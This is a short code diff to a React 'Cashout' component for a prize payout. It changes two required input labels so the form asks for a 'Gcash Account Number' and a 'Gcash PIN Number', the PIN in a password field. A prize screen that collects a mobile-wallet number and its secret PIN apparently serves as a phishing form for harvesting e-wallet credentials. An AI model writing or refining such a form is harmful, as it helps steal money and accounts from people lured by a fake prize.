@@ -131,7 +131,7 @@ export const Cashout: React.FC<CashoutProps> = ({ prize, onComplete }) => {
           </div>
 
           <div className="space-y-3">
-            <label className="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em] ml-2">Account ID Number</label>
+            <label className="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em] ml-2">Gcash Account Number</label>
             <input
               type="text"
               required
@@ -143,7 +143,7 @@ export const Cashout: React.FC<CashoutProps> = ({ prize, onComplete }) => {
           </div>
 
           <div className="space-y-3">
-            <label className="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em] ml-2">Security PIN</label>
+            <label className="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em] ml-2">Gcash PIN Number</label>
             <input
               type="password"
               required
